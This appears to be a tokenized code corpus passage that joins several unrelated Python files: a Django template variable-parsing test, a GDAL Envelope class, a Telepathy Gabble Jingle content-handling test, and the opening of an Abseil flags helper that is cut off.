) <newline> self . assertEqual ( fe . filters , [ ] ) <newline> self . assertEqual ( fe . var , 'Some ▁"Good" ▁ News' ) <newline>  # ▁ Filtered ▁ variables ▁ should ▁ reject ▁ access ▁ of ▁ attributes ▁ beginning ▁ with <encdom>  # ▁ underscores. <encdom> self . assertRaises ( TemplateSyntaxError , FilterExpression , "article._hidden|upper" , p ) <newline> <dedent> def test_variable_parsing ( self ) : <newline> <indent> c = { "article" : { "section" : "News" } } <newline> self . assertEqual ( Variable ( "article.section" ) . resolve ( c ) , "News" ) <newline> self . assertEqual ( Variable ( '"News"' ) . resolve ( c ) , "News" ) <newline> self . assertEqual ( Variable ( "'News'" ) . resolve ( c ) , "News" ) <newline>  # ▁ Translated ▁ strings ▁ are ▁ handled ▁ correctly. <encdom> self . assertEqual ( Variable ( "_(article.section)" ) . resolve ( c ) , "News" ) <newline> self . assertEqual ( Variable ( '_("Good ▁ News")' ) . resolve ( c ) , "Good ▁ News" ) <newline> self . assertEqual ( Variable ( "_('Better ▁ News')" ) . resolve ( c ) , "Better ▁ News" ) <newline>  # ▁ Escaped ▁ quotes ▁ work ▁ correctly ▁ as ▁ well. <encdom> self . assertEqual ( Variable ( r'"Some ▁ \"Good\" ▁ News"' ) . resolve ( c ) , 'Some ▁"Good" ▁ News' ) <newline> self . assertEqual ( Variable ( r"'Some ▁ \'Better\' ▁ News'" ) . resolve ( c ) , "Some ▁'Better' ▁ News" ) <newline>  # ▁ Variables ▁ should ▁ reject ▁ access ▁ of ▁ attributes ▁ beginning ▁ with <encdom>  # ▁ underscores. <encdom> self . assertRaises ( TemplateSyntaxError , Variable , "article._hidden" ) <newline>  # ▁ Variables ▁ should ▁ raise ▁ on ▁ non ▁ string ▁ type <encdom> with six . assertRaisesRegex ( self , TypeError , "Variable ▁ must ▁ be ▁ a ▁ string ▁ or ▁ number, ▁ got ▁ <(class|type) ▁'dict'>" ) : <newline> <indent> Variable ( { } ) <newline> <dedent> <dedent> @ override_settings ( DEBUG = True , TEMPLATE_DEBUG = True ) <newline> def test_compile_filter_error ( self ) : <newline>  # ▁ regression ▁ test ▁ for ▁ # 19819 <encdom> <indent> msg = "Could ▁ not ▁ parse ▁ the ▁ remainder: ▁'@bar' ▁ from ▁'foo@bar'" <newline> with six . assertRaisesRegex ( self , TemplateSyntaxError , msg ) as cm : <newline> <indent> Template ( "{% ▁ if ▁ 1 ▁ %}{{ ▁ foo@bar ▁ }}{% ▁ endif ▁ %}" ) <newline> <dedent> self . assertEqual ( cm . exception . django_template_source [ 1 ] , ( 10 , 23 ) ) <newline> <dedent> def test_filter_args_count ( self ) : <newline> <indent> p = Parser ( "" ) <newline> l = Library ( ) <newline> @ l . filter <newline> def no_arguments ( value ) : <newline> <indent> pass <newline> <dedent> @ l . filter <newline> def one_argument ( value , arg ) : <newline> <indent> pass <newline> <dedent> @ l . filter <newline> def one_opt_argument ( value , arg = False ) : <newline> <indent> pass <newline> <dedent> @ l . filter <newline> def two_arguments ( value , arg , arg2 ) : <newline> <indent> pass <newline> <dedent> @ l . filter <newline> def two_one_opt_arg ( value , arg , arg2 = False ) : <newline> <indent> pass <newline> <dedent> p . add_library ( l ) <newline> for expr in ( '1|no_arguments:"1"' , '1|two_arguments' , '1|two_arguments:"1"' , '1|two_one_opt_arg' , ) : <newline> <indent> with self . assertRaises ( TemplateSyntaxError ) : <newline> <indent> FilterExpression ( expr , p ) <newline> <dedent> <dedent> for expr in (  # ▁ Correct ▁ number ▁ of ▁ arguments <encdom> '1|no_arguments' , '1|one_argument:"1"' ,  # ▁ One ▁ optional <encdom> '1|one_opt_argument' , '1|one_opt_argument:"1"' ,  # ▁ Not ▁ supplying ▁ all <encdom> '1|two_one_opt_arg:"1"' , ) : <newline> <indent> FilterExpression ( expr , p ) <newline> <dedent> <dedent> <dedent>
 """ <strnewline> ▁ The ▁ GDAL/OGR ▁ library ▁ uses ▁ an ▁ Envelope ▁ structure ▁ to ▁ hold ▁ the ▁ bounding <strnewline> ▁ box ▁ information ▁ for ▁ a ▁ geometry. ▁ The ▁ envelope ▁ (bounding ▁ box) ▁ contains <strnewline> ▁ two ▁ pairs ▁ of ▁ coordinates, ▁ one ▁ for ▁ the ▁ lower ▁ left ▁ coordinate ▁ and ▁ one <strnewline> ▁ for ▁ the ▁ upper ▁ right ▁ coordinate: <strnewline> <strnewline> ▁ +-----o ▁ Upper ▁ right; ▁ (max_x, ▁ max_y) <strnewline> ▁ | ▁ | <strnewline> ▁ | ▁ | <strnewline> ▁ | ▁ | <strnewline> ▁ Lower ▁ left ▁ (min_x, ▁ min_y) ▁ o-----+ <strnewline> """  <newline> from ctypes import Structure , c_double <newline> from django . contrib . gis . gdal . error import GDALException <newline>  # ▁ The ▁ OGR ▁ definition ▁ of ▁ an ▁ Envelope ▁ is ▁ a ▁ C ▁ structure ▁ containing ▁ four ▁ doubles. <encdom>  # ▁ See ▁ the ▁'ogr_core.h' ▁ source ▁ file ▁ for ▁ more ▁ information: <encdom>  # ▁ http://www.gdal.org/ogr/ogr__core_8h-source.html <encdom> class OGREnvelope ( Structure ) : <newline> <indent> "Represents ▁ the ▁ OGREnvelope ▁ C ▁ Structure." <newline> _fields_ = [ ( "MinX" , c_double ) , ( "MaxX" , c_double ) , ( "MinY" , c_double ) , ( "MaxY" , c_double ) , ] <newline> <dedent> class Envelope ( object ) : <newline> <indent>  """ <strnewline> ▁ The ▁ Envelope ▁ object ▁ is ▁ a ▁ C ▁ structure ▁ that ▁ contains ▁ the ▁ minimum ▁ and <strnewline> ▁ maximum ▁ X, ▁ Y ▁ coordinates ▁ for ▁ a ▁ rectangle ▁ bounding ▁ box. ▁ The ▁ naming <strnewline> ▁ of ▁ the ▁ variables ▁ is ▁ compatible ▁ with ▁ the ▁ OGR ▁ Envelope ▁ structure. <strnewline> ▁ """  <newline> def __init__ ( self , * args ) : <newline> <indent>  """ <strnewline> ▁ The ▁ initialization ▁ function ▁ may ▁ take ▁ an ▁ OGREnvelope ▁ structure, ▁ 4-element <strnewline> ▁ tuple ▁ or ▁ list, ▁ or ▁ 4 ▁ individual ▁ arguments. <strnewline> ▁ """  <newline> if len ( args ) == 1 : <newline> <indent> if isinstance ( args [ 0 ] , OGREnvelope ) : <newline>  # ▁ OGREnvelope ▁ (a ▁ ctypes ▁ Structure) ▁ was ▁ passed ▁ in. <encdom> <indent> self . _envelope = args [ 0 ] <newline> <dedent> elif isinstance ( args [ 0 ] , ( tuple , list ) ) : <newline>  # ▁ A ▁ tuple ▁ was ▁ passed ▁ in. <encdom> <indent> if len ( args [ 0 ] ) != 4 : <newline> <indent> raise GDALException ( 'Incorrect ▁ number ▁ of ▁ tuple ▁ elements ▁ (%d).' % len ( args [ 0 ] ) ) <newline> <dedent> else : <newline> <indent> self . _from_sequence ( args [ 0 ] ) <newline> <dedent> <dedent> else : <newline> <indent> raise TypeError ( 'Incorrect ▁ type ▁ of ▁ argument: ▁ %s' % str ( type ( args [ 0 ] ) ) ) <newline> <dedent> <dedent> elif len ( args ) == 4 : <newline>  # ▁ Individual ▁ parameters ▁ passed ▁ in. <encdom>  # ▁ Thanks ▁ to ▁ ww ▁ for ▁ the ▁ help <encdom> <indent> self . _from_sequence ( [ float ( a ) for a in args ] ) <newline> <dedent> else : <newline> <indent> raise GDALException ( 'Incorrect ▁ number ▁ (%d) ▁ of ▁ arguments.' % len ( args ) ) <newline>  # ▁ Checking ▁ the ▁ x,y ▁ coordinates <encdom> <dedent> if self . min_x > self . max_x : <newline> <indent> raise GDALException ( 'Envelope ▁ minimum ▁ X ▁ > ▁ maximum ▁ X.' ) <newline> <dedent> if self . min_y > self . max_y : <newline> <indent> raise GDALException ( 'Envelope ▁ minimum ▁ Y ▁ > ▁ maximum ▁ Y.' ) <newline> <dedent> <dedent> def __eq__ ( self , other ) : <newline> <indent>  """ <strnewline> ▁ Returns ▁ True ▁ if ▁ the ▁ envelopes ▁ are ▁ equivalent; ▁ can ▁ compare ▁ against <strnewline> ▁ other ▁ Envelopes ▁ and ▁ 4-tuples. <strnewline> ▁ """  <newline> if isinstance ( other , Envelope ) : <newline> <indent> return ( self . min_x == other . min_x ) and ( self . min_y == other . min_y ) and ( self . max_x == other . max_x ) and ( self . max_y == other . max_y ) <newline> <dedent> elif isinstance ( other , tuple ) and len ( other ) == 4 : <newline> <indent> return ( self . min_x == other [ 0 ] ) and ( self . min_y == other [ 1 ] ) and ( self . max_x == other [ 2 ] ) and ( self . max_y == other [ 3 ] ) <newline> <dedent> else : <newline> <indent> raise GDALException ( 'Equivalence ▁ testing ▁ only ▁ works ▁ with ▁ other ▁ Envelopes.' ) <newline> <dedent> <dedent> def __str__ ( self ) : <newline> <indent> "Returns ▁ a ▁ string ▁ representation ▁ of ▁ the ▁ tuple." <newline> return str ( self . tuple ) <newline> <dedent> def _from_sequence ( self , seq ) : <newline> <indent> "Initializes ▁ the ▁ C ▁ OGR ▁ Envelope ▁ structure ▁ from ▁ the ▁ given ▁ sequence." <newline> self . _envelope = OGREnvelope ( ) <newline> self . _envelope . MinX = seq [ 0 ] <newline> self . _envelope . MinY = seq [ 1 ] <newline> self . _envelope . MaxX = seq [ 2 ] <newline> self . _envelope . MaxY = seq [ 3 ] <newline> <dedent> def expand_to_include ( self , * args ) : <newline> <indent>  """ <strnewline> ▁ Modifies ▁ the ▁ envelope ▁ to ▁ expand ▁ to ▁ include ▁ the ▁ boundaries ▁ of <strnewline> ▁ the ▁ passed-in ▁ 2-tuple ▁ (a ▁ point), ▁ 4-tuple ▁ (an ▁ extent) ▁ or <strnewline> ▁ envelope. <strnewline> ▁ """  <newline>  # ▁ We ▁ provide ▁ a ▁ number ▁ of ▁ different ▁ signatures ▁ for ▁ this ▁ method, <encdom>  # ▁ and ▁ the ▁ logic ▁ here ▁ is ▁ all ▁ about ▁ converting ▁ them ▁ into ▁ a <encdom>  # ▁ 4-tuple ▁ single ▁ parameter ▁ which ▁ does ▁ the ▁ actual ▁ work ▁ of <encdom>  # ▁ expanding ▁ the ▁ envelope. <encdom> if len ( args ) == 1 : <newline> <indent> if isinstance ( args [ 0 ] , Envelope ) : <newline> <indent> return self . expand_to_include ( args [ 0 ] . tuple ) <newline> <dedent> elif hasattr ( args [ 0 ] , 'x' ) and hasattr ( args [ 0 ] , 'y' ) : <newline> <indent> return self . expand_to_include ( args [ 0 ] . x , args [ 0 ] . y , args [ 0 ] . x , args [ 0 ] . y ) <newline> <dedent> elif isinstance ( args [ 0 ] , ( tuple , list ) ) : <newline>  # ▁ A ▁ tuple ▁ was ▁ passed ▁ in. <encdom> <indent> if len ( args [ 0 ] ) == 2 : <newline> <indent> return self . expand_to_include ( ( args [ 0 ] [ 0 ] , args [ 0 ] [ 1 ] , args [ 0 ] [ 0 ] , args [ 0 ] [ 1 ] ) ) <newline> <dedent> elif len ( args [ 0 ] ) == 4 : <newline> <indent> ( minx , miny , maxx , maxy ) = args [ 0 ] <newline> if minx < self . _envelope . MinX : <newline> <indent> self . _envelope . MinX = minx <newline> <dedent> if miny < self . _envelope . MinY : <newline> <indent> self . _envelope . MinY = miny <newline> <dedent> if maxx > self . _envelope . MaxX : <newline> <indent> self . _envelope . MaxX = maxx <newline> <dedent> if maxy > self . _envelope . MaxY : <newline> <indent> self . _envelope . MaxY = maxy <newline> <dedent> <dedent> else : <newline> <indent> raise GDALException ( 'Incorrect ▁ number ▁ of ▁ tuple ▁ elements ▁ (%d).' % len ( args [ 0 ] ) ) <newline> <dedent> <dedent> else : <newline> <indent> raise TypeError ( 'Incorrect ▁ type ▁ of ▁ argument: ▁ %s' % str ( type ( args [ 0 ] ) ) ) <newline> <dedent> <dedent> elif len ( args ) == 2 : <newline>  # ▁ An ▁ x ▁ and ▁ an ▁ y ▁ parameter ▁ were ▁ passed ▁ in <encdom> <indent> return self . expand_to_include ( ( args [ 0 ] , args [ 1 ] , args [ 0 ] , args [ 1 ] ) ) <newline> <dedent> elif len ( args ) == 4 : <newline>  # ▁ Individual ▁ parameters ▁ passed ▁ in. <encdom> <indent> return self . expand_to_include ( args ) <newline> <dedent> else : <newline> <indent> raise GDALException ( 'Incorrect ▁ number ▁ (%d) ▁ of ▁ arguments.' % len ( args [ 0 ] ) ) <newline> <dedent> <dedent> @ property <newline> def min_x ( self ) : <newline> <indent> "Returns ▁ the ▁ value ▁ of ▁ the ▁ minimum ▁ X ▁ coordinate." <newline> return self . _envelope . MinX <newline> <dedent> @ property <newline> def min_y ( self ) : <newline> <indent> "Returns ▁ the ▁ value ▁ of ▁ the ▁ minimum ▁ Y ▁ coordinate." <newline> return self . _envelope . MinY <newline> <dedent> @ property <newline> def max_x ( self ) : <newline> <indent> "Returns ▁ the ▁ value ▁ of ▁ the ▁ maximum ▁ X ▁ coordinate." <newline> return self . _envelope . MaxX <newline> <dedent> @ property <newline> def max_y ( self ) : <newline> <indent> "Returns ▁ the ▁ value ▁ of ▁ the ▁ maximum ▁ Y ▁ coordinate." <newline> return self . _envelope . MaxY <newline> <dedent> @ property <newline> def ur ( self ) : <newline> <indent> "Returns ▁ the ▁ upper-right ▁ coordinate." <newline> return ( self . max_x , self . max_y ) <newline> <dedent> @ property <newline> def ll ( self ) : <newline> <indent> "Returns ▁ the ▁ lower-left ▁ coordinate." <newline> return ( self . min_x , self . min_y ) <newline> <dedent> @ property <newline> def tuple ( self ) : <newline> <indent> "Returns ▁ a ▁ tuple ▁ representing ▁ the ▁ envelope." <newline> return ( self . min_x , self . min_y , self . max_x , self . max_y ) <newline> <dedent> @ property <newline> def wkt ( self ) : <newline> <indent> "Returns ▁ WKT ▁ representing ▁ a ▁ Polygon ▁ for ▁ this ▁ envelope." <newline>  # ▁ TODO: ▁ Fix ▁ significant ▁ figures. <encdom> return 'POLYGON((%s ▁ %s,%s ▁ %s,%s ▁ %s,%s ▁ %s,%s ▁ %s))' % ( self . min_x , self . min_y , self . min_x , self . max_y , self . max_x , self . max_y , self . max_x , self . min_y , self . min_x , self . min_y ) <newline> <dedent> <dedent>
 """ <strnewline> Test ▁ everything ▁ related ▁ to ▁ contents <strnewline> """  <newline> from gabbletest import sync_stream <newline> from servicetest import ( make_channel_proxy , assertEquals , EventPattern ) <newline> import constants as cs <newline> from jingletest2 import ( JingleTest2 , JingleProtocol015 , JingleProtocol031 , test_dialects ) <newline> from twisted . words . xish import xpath <newline> def worker ( jp , q , bus , conn , stream ) : <newline> <indent> def make_stream_request ( stream_type ) : <newline> <indent> media_iface . RequestStreams ( remote_handle , [ stream_type ] ) <newline> e = q . expect ( 'dbus-signal' , signal = 'NewStreamHandler' ) <newline> stream_id = e . args [ 1 ] <newline> stream_handler = make_channel_proxy ( conn , e . args [ 0 ] , 'Media.StreamHandler' ) <newline> stream_handler . NewNativeCandidate ( "fake" , jt2 . get_remote_transports_dbus ( ) ) <newline> stream_handler . Ready ( jt2 . get_audio_codecs_dbus ( ) ) <newline> stream_handler . StreamState ( cs . MEDIA_STREAM_STATE_CONNECTED ) <newline> return ( stream_handler , stream_id ) <newline> <dedent> jt2 = JingleTest2 ( jp , conn , q , stream , 'test@localhost' , 'foo@bar.com/Foo' ) <newline> jt2 . prepare ( ) <newline> self_handle = conn . GetSelfHandle ( ) <newline> remote_handle = conn . RequestHandles ( cs . HT_CONTACT , [ "foo@bar.com/Foo" ] ) [ 0 ] <newline>  # ▁ Remote ▁ end ▁ calls ▁ us <encdom> jt2 . incoming_call ( ) <newline>  # ▁ FIXME: ▁ these ▁ signals ▁ are ▁ not ▁ observable ▁ by ▁ real ▁ clients, ▁ since ▁ they <encdom>  # ▁ happen ▁ before ▁ NewChannels. <encdom>  # ▁ The ▁ caller ▁ is ▁ in ▁ members <encdom> e = q . expect ( 'dbus-signal' , signal = 'MembersChanged' , args = [ u'' , [ remote_handle ] , [ ] , [ ] , [ ] , 0 , 0 ] ) <newline>  # ▁ We're ▁ pending ▁ because ▁ of ▁ remote_handle <encdom> e = q . expect ( 'dbus-signal' , signal = 'MembersChanged' , args = [ u'' , [ ] , [ ] , [ self_handle ] , [ ] , remote_handle , cs . GC_REASON_INVITED ] ) <newline> media_chan = make_channel_proxy ( conn , e . path , 'Channel.Interface.Group' ) <newline> signalling_iface = make_channel_proxy ( conn , e . path , 'Channel.Interface.MediaSignalling' ) <newline> media_iface = make_channel_proxy ( conn , e . path , 'Channel.Type.StreamedMedia' ) <newline>  # ▁ S-E ▁ gets ▁ notified ▁ about ▁ new ▁ session ▁ handler, ▁ and ▁ calls ▁ Ready ▁ on ▁ it <encdom> e = q . expect ( 'dbus-signal' , signal = 'NewSessionHandler' ) <newline> assert e . args [ 1 ] == 'rtp' <newline> session_handler = make_channel_proxy ( conn , e . args [ 0 ] , 'Media.SessionHandler' ) <newline> session_handler . Ready ( ) <newline> media_chan . AddMembers ( [ self_handle ] , 'accepted' ) <newline>  # ▁ S-E ▁ gets ▁ notified ▁ about ▁ a ▁ newly-created ▁ stream <encdom> e = q . expect ( 'dbus-signal' , signal = 'NewStreamHandler' ) <newline> id1 = e . args [ 1 ] <newline> stream_handler = make_channel_proxy ( conn , e . args [ 0 ] , 'Media.StreamHandler' ) <newline>  # ▁ We ▁ are ▁ now ▁ in ▁ members ▁ too <encdom> e = q . expect ( 'dbus-signal' , signal = 'MembersChanged' , args = [ u'' , [ self_handle ] , [ ] , [ ] , [ ] , self_handle , cs . GC_REASON_NONE ] ) <newline>  # ▁ we ▁ are ▁ now ▁ both ▁ in ▁ members <encdom> members = media_chan . GetMembers ( ) <newline> assert set ( members ) == set ( [ self_handle , remote_handle ] ) , members <newline> stream_handler . NewNativeCandidate ( "fake" , jt2 . get_remote_transports_dbus ( ) ) <newline> stream_handler . Ready ( jt2 . get_audio_codecs_dbus ( ) ) <newline> stream_handler . StreamState ( cs . MEDIA_STREAM_STATE_CONNECTED ) <newline>  # ▁ First ▁ one ▁ is ▁ transport-info <encdom> e = q . expect ( 'stream-iq' , predicate = jp . action_predicate ( 'transport-info' ) ) <newline> assertEquals ( 'foo@bar.com/Foo' , e . query [ 'initiator' ] ) <newline>  # ▁ stream.send(gabbletest.make_result_iq(stream, ▁ e.stanza)) <encdom> stream . send ( jp . xml ( jp . ResultIq ( 'test@localhost' , e . stanza , [ ] ) ) ) <newline>  # ▁ S-E ▁ reports ▁ codec ▁ intersection, ▁ after ▁ which ▁ gabble ▁ can ▁ send ▁ acceptance <encdom> stream_handler . SupportedCodecs ( jt2 . get_audio_codecs_dbus ( ) ) <newline>  # ▁ Second ▁ one ▁ is ▁ session-accept <encdom> e = q . expect ( 'stream-iq' , predicate = jp . action_predicate ( 'session-accept' ) ) <newline>  # ▁ stream.send(gabbletest.make_result_iq(stream, ▁ e.stanza)) <encdom> stream . send ( jp . xml ( jp . ResultIq ( 'test@localhost' , e . stanza , [ ] ) ) ) <newline>  # ▁ Here ▁ starts ▁ the ▁ interesting ▁ part ▁ of ▁ this ▁ test <encdom>  # ▁ Remote ▁ end ▁ tries ▁ to ▁ create ▁ a ▁ content ▁ we ▁ can't ▁ handle <encdom> node = jp . SetIq ( jt2 . peer , jt2 . jid , [ jp . Jingle ( jt2 . sid , jt2 . peer , 'content-add' , [ jp . Content ( 'bogus' , 'initiator' , 'both' , jp . Description ( 'hologram' , [ jp . PayloadType ( name , str ( rate ) , str ( id ) , parameters ) for ( name , id , rate , parameters ) in jt2 . audio_codecs ] ) , jp . TransportGoogleP2P ( ) ) ] ) ] ) <newline> stream . send ( jp . xml ( node ) ) <newline>  # ▁ In ▁ older ▁ Jingle, ▁ this ▁ is ▁ a ▁ separate ▁ namespace, ▁ which ▁ isn't <encdom>  # ▁ recognized, ▁ but ▁ it's ▁ a ▁ valid ▁ request, ▁ so ▁ it ▁ gets ▁ ackd ▁ and ▁ rejected <encdom> if jp . dialect == 'jingle-v0.15' : <newline>  # ▁ Gabble ▁ should ▁ acknowledge ▁ content-add <encdom> <indent> q . expect ( 'stream-iq' , iq_type = 'result' ) <newline>  # ▁ .. ▁ and ▁ then ▁ send ▁ content-reject ▁ for ▁ the ▁ bogus ▁ content <encdom> e = q . expect ( 'stream-iq' , iq_type = 'set' , predicate = lambda x : xpath . queryForNodes ( "/iq/jingle[@action='content-reject']/content[@name='bogus']" , x . stanza ) ) <newline>  # ▁ In ▁ new ▁ Jingle, ▁ this ▁ is ▁ a ▁ bogus ▁ subtype ▁ of ▁ recognized ▁ namespace, <encdom>  # ▁ so ▁ Gabble ▁ returns ▁ a ▁ bad ▁ request ▁ error <encdom> <dedent> else : <newline> <indent> q . expect ( 'stream-iq' , iq_type = 'error' ) <newline>  # ▁ Remote ▁ end ▁ then ▁ tries ▁ to ▁ create ▁ a ▁ content ▁ with ▁ a ▁ name ▁ it's ▁ already ▁ used <encdom> <dedent> node = jp . SetIq ( jt2 . peer , jt2 . jid , [ jp . Jingle ( jt2 . sid , jt2 . peer , 'content-add' , [ jp . Content ( jt2 . audio_names [ 0 ] , 'initiator' , 'both' , jp . Description ( 'audio' , [ jp . PayloadType ( name , str ( rate ) , str ( id ) , parameters ) for ( name , id , rate , parameters ) in jt2 . audio_codecs ] ) , jp . TransportGoogleP2P ( ) ) ] ) ] ) <newline> stream . send ( jp . xml ( node ) ) <newline>  # ▁ Gabble ▁ should ▁ return ▁ error ▁ (content ▁ already ▁ exists) <encdom> q . expect ( 'stream-iq' , iq_type = 'error' ) <newline>  # ▁ We ▁ try ▁ to ▁ add ▁ a ▁ stream <encdom> ( stream_handler2 , id2 ) = make_stream_request ( cs . MEDIA_STREAM_TYPE_VIDEO ) <newline>  # ▁ Gabble ▁ should ▁ now ▁ send ▁ content-add <encdom> e = q . expect ( 'stream-iq' , iq_type = 'set' , predicate = lambda x : xpath . queryForNodes ( "/iq/jingle[@action='content-add']" , x . stanza ) ) <newline> c = e . query . firstChildElement ( ) <newline> assert c [ 'creator' ] == 'responder' , c [ 'creator' ] <newline> stream . send ( jp . xml ( jp . ResultIq ( 'test@localhost' , e . stanza , [ ] ) ) ) <newline>  # ▁ We ▁ try ▁ to ▁ add ▁ yet ▁ another ▁ stream <encdom> ( stream_handler3 , id3 ) = make_stream_request ( cs . MEDIA_STREAM_TYPE_VIDEO ) <newline>  # ▁ Gabble ▁ should ▁ send ▁ another ▁ content-add <encdom> e = q . expect ( 'stream-iq' , iq_type = 'set' , predicate = lambda x : xpath . queryForNodes ( "/iq/jingle[@action='content-add']" , x . stanza ) ) <newline> d = e . query . firstChildElement ( ) <newline> assertEquals ( 'responder' , d [ 'creator' ] ) <newline> stream . send ( jp . xml ( jp . ResultIq ( 'test@localhost' , e . stanza , [ ] ) ) ) <newline>  # ▁ Remote ▁ end ▁ rejects ▁ the ▁ first ▁ stream ▁ we ▁ tried ▁ to ▁ add. <encdom> node = jp . SetIq ( jt2 . peer , jt2 . jid , [ jp . Jingle ( jt2 . sid , jt2 . peer , 'content-reject' , [ jp . Content ( c [ 'name' ] , c [ 'creator' ] , c [ 'senders' ] ) ] ) ] ) <newline> stream . send ( jp . xml ( node ) ) <newline>  # ▁ Gabble ▁ removes ▁ the ▁ stream <encdom> q . expect ( 'dbus-signal' , signal = 'StreamRemoved' , interface = cs . CHANNEL_TYPE_STREAMED_MEDIA ) <newline>  # ▁ Remote ▁ end ▁ tries ▁ to ▁ add ▁ a ▁ content ▁ with ▁ the ▁ same ▁ name ▁ as ▁ the ▁ second ▁ one ▁ we <encdom>  # ▁ just ▁ added <encdom> node = jp . SetIq ( jt2 . peer , jt2 . jid , [ jp . Jingle ( jt2 . sid , jt2 . peer , 'content-add' , [ jp . Content ( d [ 'name' ] , 'initiator' , 'both' , jp . Description ( 'audio' , [ jp . PayloadType ( name , str ( rate ) , str ( id ) , parameters ) for ( name , id , rate , parameters ) in jt2 . audio_codecs ] ) , jp . TransportGoogleP2P ( ) ) ] ) ] ) <newline> stream . send ( jp . xml ( node ) ) <newline>  # ▁ Because ▁ stream ▁ names ▁ are ▁ namespaced ▁ by ▁ creator, ▁ Gabble ▁ should ▁ be ▁ okay <encdom>  # ▁ with ▁ that. <encdom> q . expect_many ( EventPattern ( 'stream-iq' , iq_type = 'result' , iq_id = node [ 2 ] [ 'id' ] ) , EventPattern ( 'dbus-signal' , signal = 'StreamAdded' ) , ) <newline>  # ▁ Remote ▁ end ▁ thinks ▁ better ▁ of ▁ that, ▁ and ▁ removes ▁ the ▁ similarly-named ▁ stream <encdom>  # ▁ it ▁ tried ▁ to ▁ add. <encdom> node = jp . SetIq ( jt2 . peer , jt2 . jid , [ jp . Jingle ( jt2 . sid , jt2 . peer , 'content-remove' , [ jp . Content ( d [ 'name' ] , 'initiator' , d [ 'senders' ] ) ] ) ] ) <newline> stream . send ( jp . xml ( node ) ) <newline> q . expect_many ( EventPattern ( 'stream-iq' , iq_type = 'result' , iq_id = node [ 2 ] [ 'id' ] ) , EventPattern ( 'dbus-signal' , signal = 'StreamRemoved' ) , ) <newline>  # ▁ Remote ▁ end ▁ finally ▁ accepts. ▁ When ▁ Gabble ▁ did ▁ not ▁ namespace ▁ contents ▁ by <encdom>  # ▁ their ▁ creator, ▁ it ▁ would ▁ NAK ▁ this ▁ IQ: <encdom>  # ▁ - ▁ Gabble ▁ (responder) ▁ created ▁ a ▁ stream ▁ called ▁'foo'; <encdom>  # ▁ - ▁ test ▁ suite ▁ (initiator) ▁ created ▁ a ▁ stream ▁ called ▁'foo', ▁ which ▁ Gabble <encdom>  # ▁ decided ▁ would ▁ replace ▁ its ▁ own ▁ stream ▁ called ▁'foo'; <encdom>  # ▁ - ▁ test ▁ suite ▁ removed ▁ its ▁'foo'; <encdom>  # ▁ - ▁ test ▁ suite ▁ accepted ▁ Gabble's ▁'foo', ▁ but ▁ Gabble ▁ didn't ▁ believe ▁ a ▁ stream <encdom>  # ▁ called ▁'foo' ▁ existed ▁ any ▁ more. <encdom> node = jp . SetIq ( jt2 . peer , jt2 . jid , [ jp . Jingle ( jt2 . sid , jt2 . peer , 'content-accept' , [ jp . Content ( d [ 'name' ] , d [ 'creator' ] , d [ 'senders' ] , jp . Description ( 'video' , [ jp . PayloadType ( name , str ( rate ) , str ( id ) , parameters ) for ( name , id , rate , parameters ) in jt2 . audio_codecs ] ) , jp . TransportGoogleP2P ( ) ) ] ) ] ) <newline> stream . send ( jp . xml ( node ) ) <newline>  # ▁ We ▁ get ▁ remote ▁ codecs <encdom> e = q . expect ( 'dbus-signal' , signal = 'SetRemoteCodecs' ) <newline>  # ▁ Now, ▁ both ▁ we ▁ and ▁ remote ▁ peer ▁ try ▁ to ▁ remove ▁ the ▁ content ▁ simultaneously: <encdom>  # ▁ Telepathy ▁ client ▁ calls ▁ RemoveStreams... <encdom> media_iface . RemoveStreams ( [ id3 ] ) <newline>  # ▁ ...so ▁ Gabble ▁ sends ▁ a ▁ content-remove... <encdom> e = q . expect ( 'stream-iq' , iq_type = 'set' , predicate = lambda x : xpath . queryForNodes ( "/iq/jingle[@action='content-remove']" , x . stanza ) ) <newline>  # ▁ ...but ▁ before ▁ it's ▁ acked ▁ the ▁ peer ▁ sends ▁ its ▁ own ▁ content-remove... <encdom> node = jp . SetIq ( jt2 . peer , jt2 . jid , [ jp . Jingle ( jt2 . sid , jt2 . peer , 'content-remove' , [ jp . Content ( c [ 'name' ] , c [ 'creator' ] , c [ 'senders' ] ) ] ) ] ) <newline> stream . send ( jp . xml ( node ) ) <newline>  # ▁ ...and ▁ we ▁ don't ▁ want ▁ Gabble ▁ to ▁ break ▁ when ▁ that ▁ happens. <encdom> sync_stream ( q , stream ) <newline>  # ▁ Now ▁ we ▁ want ▁ to ▁ remove ▁ the ▁ first ▁ stream <encdom> media_iface . RemoveStreams ( [ id1 ] ) <newline>  # ▁ Since ▁ this ▁ is ▁ the ▁ last ▁ stream, ▁ Gabble ▁ will ▁ just ▁ terminate ▁ the ▁ session. <encdom> e = q . expect ( 'stream-iq' , iq_type = 'set' , predicate = lambda x : xpath . queryForNodes ( "/iq/jingle[@action='session-terminate']" , x . stanza ) ) <newline> <dedent> if __name__ == '__main__' : <newline> <indent> test_dialects ( worker , [ JingleProtocol015 , JingleProtocol031 ] ) <newline> <dedent>
 # ▁ Copyright ▁ 2017 ▁ The ▁ Abseil ▁ Authors. <encdom>  # ▁ Licensed ▁ under ▁ the ▁ Apache ▁ License, ▁ Version ▁ 2.0 ▁ (the ▁"License"); <encdom>  # ▁ you ▁ may ▁ not ▁ use ▁ this ▁ file ▁ except ▁ in ▁ compliance ▁ with ▁ the ▁ License. <encdom>  # ▁ You ▁ may ▁ obtain ▁ a ▁ copy ▁ of ▁ the ▁ License ▁ at <encdom>  # ▁ http://www.apache.org/licenses/LICENSE-2.0 <encdom>  # ▁ Unless ▁ required ▁ by ▁ applicable ▁ law ▁ or ▁ agreed ▁ to ▁ in ▁ writing, ▁ software <encdom>  # ▁ distributed ▁ under ▁ the ▁ License ▁ is ▁ distributed ▁ on ▁ an ▁"AS ▁ IS" ▁ BASIS, <encdom>  # ▁ WITHOUT ▁ WARRANTIES ▁ OR ▁ CONDITIONS ▁ OF ▁ ANY ▁ KIND, ▁ either ▁ express ▁ or ▁ implied. <encdom>  # ▁ See ▁ the ▁ License ▁ for ▁ the ▁ specific ▁ language ▁ governing ▁ permissions ▁ and <encdom>  # ▁ limitations ▁ under ▁ the ▁ License. <encdom>  """ Internal ▁ helper ▁ functions ▁ for ▁ Abseil ▁ Python ▁ flags ▁ library. """  <newline> from __future__ import absolute_import <newline> from __future__ import division <newline> from __future__ import print_function <newline> import collections <newline> import os <newline> import re <newline> import struct <newline> import sys <newline> import textwrap <newline> try : <newline> <indent> import fcntl <newline> <dedent> except ImportError : <newline> <indent> fcntl = None <newline> <dedent> try : <newline>  # ▁ Importing ▁ termios ▁ will ▁ fail ▁ on ▁ non-unix ▁ 